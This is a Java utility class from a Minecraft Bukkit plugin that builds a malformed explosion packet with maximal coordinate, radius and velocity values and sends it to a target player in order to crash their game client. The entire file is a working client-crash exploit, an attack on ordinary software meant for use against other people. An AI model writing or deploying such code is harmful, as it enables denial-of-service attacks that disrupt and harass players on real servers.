package com.bassolicodes.utils;

import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.List;

public final class Crash {

    private static Object packet;

    public static void crash(Player player) {
        try {
            Reflection.sendPacket(player, packet);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static void load() {
        try {
            Object Vec3D;
            Class<?> explosionClass;
            Class<?> vectorClass = Reflection.getNMSClass("Vec3D");

            explosionClass = Reflection.getNMSClass("PacketPlayOutExplosion");

            Constructor<?> Vector3dConstructor = vectorClass.getConstructor(double.class, double.class, double.class);
            Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);

            Constructor<?> explosionConstructor = explosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, vectorClass);
            packet = explosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), Vec3D);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

}